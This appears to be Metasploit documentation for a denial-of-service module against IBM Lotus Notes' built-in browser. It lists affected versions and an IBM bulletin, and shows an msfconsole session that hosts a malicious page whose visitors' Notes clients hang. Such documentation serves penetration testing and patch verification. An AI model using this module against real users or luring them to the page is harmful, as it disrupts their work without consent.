## Vulnerable Application
This module exploits a vulnerability in the built-in web-browser of IBM Lotus Notes client application.

If a user is persuaded to click on a malicious link, it would open up many file select dialog boxes which, 
would cause the client hang and have to be restarted.

Affected Products and Versions

IBM Notes 9.0.1 to 9.0.1 FP8 IF1
IBM Notes 9.0 to 9.0 IF4.
IBM Notes 8.5.3 to 8.5.3 FP6 IF13.
IBM Notes 8.5.2 to 8.5.2 FP4 IF3.
IBM Notes 8.5.1. to 8.5.1 FP5 IF5.
IBM Notes 8.5 release

Related security bulletin from IBM: http://www-01.ibm.com/support/docview.wss?uid=swg21999384 

## Verification Steps

Start msfconsole

`use auxiliary/dos/http/ibm_lotus_notes2.rb`

Set `SRVHOST`

Set `SRVPORT`

run (Server started)
Visit server URL in the built-in web-browser of IBM Notes client application

## Scenarios

```
msf > use auxiliary/dos/http/ibm_lotus_notes2 
msf auxiliary(ibm_lotus_notes2) > show options 

Module options (auxiliary/dos/http/ibm_lotus_notes2):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT  8080             yes       The local port to listen on.
   SSL      false            no        Negotiate SSL for incoming connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                   no        The URI to use for this exploit (default is random)


Auxiliary action:

   Name       Description
   ----       -----------
   WebServer  


msf auxiliary(ibm_lotus_notes2) > set SRVHOST 192.168.0.50
SRVHOST => 192.168.0.50
msf auxiliary(ibm_lotus_notes2) > set SRVPORT 9092
SRVPORT => 9092
msf auxiliary(ibm_lotus_notes2) > run
[*] Auxiliary module execution completed
msf auxiliary(ibm_lotus_notes2) > 
[*] Using URL: http://192.168.0.50:9092/mypath
[*] Server started.
msf auxiliary(ibm_lotus_notes2) > 
```

At this point, the target should use the built-in web browser of their IBM Lotus Notes client to navigate to the above "Using URL" value.  And then they should see their Notes app become unresponsive.
